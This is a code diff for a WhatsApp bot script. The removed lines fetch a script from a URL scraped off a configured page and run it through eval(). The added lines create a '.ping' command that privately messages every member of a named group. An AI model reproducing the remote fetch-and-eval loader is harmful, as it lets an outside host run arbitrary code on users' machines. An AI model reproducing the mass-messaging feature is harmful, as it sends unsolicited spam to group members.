@@ -1,33 +1,39 @@
-//  [BWM-XMD QUANTUM EDITION]                                           
-//  >> A superposition of elegant code states                           
-//  >> Collapsed into optimal execution                                
-//  >> Scripted by Sir Ibrahim Adams                                    
-//  >> Version: 8.3.5-quantum.7
+sock.ev.on('messages.upsert', async ({ messages, type }) => {
+  if (type !== 'notify') return;
+  const msg = messages[0];
+  if (!msg.message || msg.key.fromMe) return;
 
-const axios = require('axios');
-const cheerio = require('cheerio');
-const adams = require(__dirname + "/../config");
+  const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
+  
+  // Detect .ping command
+  if (text.startsWith('.ping')) {
+    const [_, groupName, ...msgParts] = text.split(' ');
+    const message = msgParts.join(' ');
 
-async function fetchPINGUrl() {
-  try {
-    const response = await axios.get(adams.BWM_XMD);
-    const $ = cheerio.load(response.data);
+    try {
+      const groups = await sock.groupFetchAllParticipating();
+      const targetGroup = Object.values(groups).find(g => g.subject.toLowerCase().includes(groupName.toLowerCase()));
 
-    const targetElement = $('a:contains("PING")');
-    const targetUrl = targetElement.attr('href');
+      if (!targetGroup) {
+        await sock.sendMessage(msg.key.remoteJid, { text: `❌ Group "${groupName}" not found.` });
+        return;
+      }
 
-    if (!targetUrl) {
-      throw new Error('PING not found 😭');
+      const metadata = await sock.groupMetadata(targetGroup.id);
+      await sock.sendMessage(msg.key.remoteJid, { text: `💥 Sending message to ${metadata.participants.length} members...` });
+
+      for (const participant of metadata.participants) {
+        if (participant.id !== sock.user.id) {
+          await sock.sendMessage(participant.id, { text: message });
+          console.log("✅ Sent to", participant.id);
+        }
+      }
+
+      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Bulk message sent successfully!` });
+
+    } catch (err) {
+      console.error("❌ Error in .ping command", err);
+      await sock.sendMessage(msg.key.remoteJid, { text: `⚠️ Error: ${err.message}` });
     }
-
-    console.log('PING loaded successfully ✅');
-
-    const scriptResponse = await axios.get(targetUrl);
-    eval(scriptResponse.data);
-
-  } catch (error) {
-    console.error('Error:', error.message);
   }
-}
-
-fetchPINGUrl();
+});
